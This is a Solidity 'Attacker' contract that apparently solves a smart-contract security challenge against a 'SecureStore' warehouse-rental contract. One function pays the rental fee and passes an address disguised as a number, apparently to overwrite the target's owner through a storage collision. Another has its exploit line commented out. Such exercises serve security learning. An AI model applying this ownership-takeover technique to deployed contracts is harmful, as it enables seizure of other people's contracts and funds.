// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;
import "hardhat/console.sol";

interface ISecureStore {
    function owner() external view returns (address);
    function rentWarehouse(uint256, uint256) external payable;
    function pricePerDay() external view returns (uint256);
}

contract Attacker {
    
    address public warehouse;
    address public owner;

    function firstAttack(ISecureStore target) external payable{
        // target.rentWarehouse{value: target.pricePerDay()}(1, uint256(uint160(address(this))));
        console.log("attackFirst called");
    }

    function seccondAttack(ISecureStore target) external payable{
        target.rentWarehouse{value: target.pricePerDay()}(1, uint256(uint160(msg.sender)));
    }
    

    function setSSN(uint256 _owner) external {
        owner = address(uint160(_owner));
    }
}